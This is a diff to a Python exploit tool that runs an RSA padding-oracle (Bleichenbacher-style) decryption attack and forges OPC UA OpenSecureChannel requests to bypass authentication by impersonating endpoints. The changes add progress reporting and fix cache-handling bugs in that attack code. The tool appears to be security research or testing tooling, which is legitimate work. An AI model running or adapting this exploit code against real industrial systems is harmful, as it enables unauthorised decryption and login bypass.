@@ -15,6 +15,8 @@ from binascii import hexlify, unhexlify
 from base64 import b64encode, b64decode
 from datetime import datetime, timedelta
 from pathlib import Path
+from decimal import Decimal
+from io import BytesIO
 
 import sys, os, itertools, re, math, hashlib, json
 
@@ -727,6 +729,7 @@ def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : byte
   # Metrics for progress reporting.
   query_count = 0
   i = 0
+  msize = f'{Decimal(B):.2E}'
     
   # Oracle function.
   def query(candidate):
@@ -738,7 +741,7 @@ def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : byte
     # Report progress for every query.
     query_count += 1
     spinnything = '/-\\|'[(query_count // 30) % 4]
-    print(f'[{spinnything}] Progress: iteration {i}; oracle queries: {query_count}', end='\r', file=sys.stderr, flush=True)
+    print(f'[{spinnything}] Progress: iteration {i}; interval size: {msize}; oracle queries: {query_count}', end='\r', file=sys.stderr, flush=True)
     
     return result
     
@@ -759,7 +762,6 @@ def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : byte
   test_factor = lambda sval: query(c0 * pow(sval, e, n) % n)
   
   M_i = {(2 * B, 3 * B - 1)}
-  
   i = 1
   s_i = ceildiv(n, 3*B)
 
@@ -796,6 +798,7 @@ def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : byte
         for a, b in M_i
         for r in range(ceildiv(a*s_i-3*B+1, n), (b*s_i-2*B) // n + 1)
     }
+    msize = f'{Decimal(sum(b - a for a,b in M_i)):.2E}'
     
     # Step 4: Computing the solution.
     if len(M_i) == 1:
@@ -1123,12 +1126,12 @@ def bypass_opn(impersonate_endpoint : endpointDescription.Type, login_endpoint :
       log(f'Error parsing {cache} contents. Ignoring it and starting a new cache file.')
       
   # An OPN can be reused as long as the endpoints use the same certificates and security policies.
-  ep_id = lambda ep: f'{hexlify(certificate_thumbprint(ep.serverCertificate))}-{ep.securityPolicyUri.name}'
+  ep_id = lambda ep: f'{hexlify(certificate_thumbprint(ep.serverCertificate)).decode()}-{ep.securityPolicyUri.name}'
   cachekey = f'{ep_id(impersonate_endpoint)}/{ep_id(login_endpoint)}'
   if cachekey in cachedata:
     log('Using signed+encrypted OPN request from cache.')
     opn_req = OpenSecureChannelMessage()
-    opn_req.from_bytes(b64decode(cachedata[cachekey]))
+    opn_req.from_bytes(BytesIO(b64decode(cachedata[cachekey])))
   else:
     opn_req = forge_opn_request(impersonate_endpoint, login_endpoint, opn_oracle, password_oracle)
     log(f'Storing signed+encrypted OPN request in cache file {cache}.')
